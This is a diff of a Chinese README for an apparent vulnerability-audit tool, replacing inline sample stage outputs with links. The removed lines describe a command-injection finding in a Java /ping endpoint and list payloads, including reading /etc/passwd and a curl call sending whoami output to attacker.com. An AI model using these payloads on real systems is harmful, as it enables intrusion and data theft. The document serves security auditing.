@@ -79,74 +79,13 @@ _output/
 
 ## 示例产物
 
-`docs/` 目录包含各阶段产出的示例文件，内容如下：
+`docs/` 目录包含各阶段产出的示例文件，可点击查看：
 
-### Stage 1: 攻击面识别 (`docs/surfaces/iface-REST-ping.md`)
-
-```markdown
-# 攻击面条目
-
-- **类型**：iface
-- **分类**：REST
-- **来源**：src/main/java/.../PingController.java:18 ping()
-- **描述**：接口健康检查，执行系统 ping 命令并返回结果
-- **URL**：GET /ping
-- **方法**：ping()
-- **参数**：query: host (default: "8.8.8.8")
-- **发现**：host 参数直接来源于用户 URL 查询参数，未经任何校验即传入后续 shell 命令执行流程
-```
-
-### Stage 2: 攻击面分析 (`docs/analysis/iface-REST-ping.md`)
-
-分析产物的核心内容（已省略流程图等较长部分）：
-
-```
-GET /ping — 系统 ping 健康检查
-来源：PingController.java:18    参数：query host (default: 8.8.8.8)
-
-调用链：PingController → PingService → CommandExecutor → ScriptRunner
-关键风险：ScriptRunner.java:17 拼接命令 cmd = scriptPath + " " + host
-           ScriptRunner.java:18 Runtime.exec("/bin/sh", "-c", cmd)
-校验状态：host 参数无 @Pattern / @Size / @NotNull 等注解式校验
-```
-
-### Stage 2.5: 漏洞分析任务 (`docs/vuln_tasks/iface-REST-ping-1.md`)
-
-```markdown
-# 命令注入 — GET /ping host 参数
-
-**验证目标**：确认是否存在命令注入漏洞
-**疑点位置**：
-- PingController.java:24 — 接收 host 参数，无校验注解
-- ScriptRunner.java:17-19 — 拼接命令字符串并执行
-- ping.sh:2 — $1 未加引号
-
-**疑点原因**：host 参数完全由 HTTP query 传入，外部可控，且无任何校验；
-ScriptRunner 将 host 直接拼入 cmd，通过 /bin/sh -c 执行；
-ping.sh 中 $1 未加引号。
-
-**优先级**：高
-```
-
-### Stage 3: 漏洞结论 (`docs/vulnerabilities/VULN-iface-REST-ping-1-1.md`)
-
-```
-类型：命令注入    严重性：严重 (CVSS 9.8)
-触发条件：GET /ping?host=<payload>
-Payload：;id;   |   8.8.8.8;cat+/etc/passwd   |   8.8.8.8||curl+http://attacker.com/$(whoami)
-调用链：host → Controller → Service → CommandExecutor → ScriptRunner → /bin/sh -c
-事实依据：参数无校验、字符串拼接命令、shell 元字符无转义、$1 未加引号
-```
-
-### Stage 4: 二次审查 (`docs/vuln_review/VULN-VULN-iface-REST-ping-1-1.md`)
-
-```
-审查结论：有漏洞 ✅
-审查理由：应用为完整独立系统（含 main 启动、无 Spring Security），
-无外部网关补偿措施。证据链完整，CVSS 9.8 合理。
-```
-
----
+- [Stage 1 攻击面识别](docs/surfaces/iface-REST-ping.md)
+- [Stage 2 攻击面分析](docs/analysis/iface-REST-ping.md)
+- [Stage 2.5 漏洞分析任务](docs/vuln_tasks/iface-REST-ping-1.md)
+- [Stage 3 漏洞结论](docs/vulnerabilities/VULN-iface-REST-ping-1-1.md)
+- [Stage 4 二次审查](docs/vuln_review/VULN-VULN-iface-REST-ping-1-1.md)
 
 `config/analysis-config.yaml` 控制各阶段启用和并行度：
 
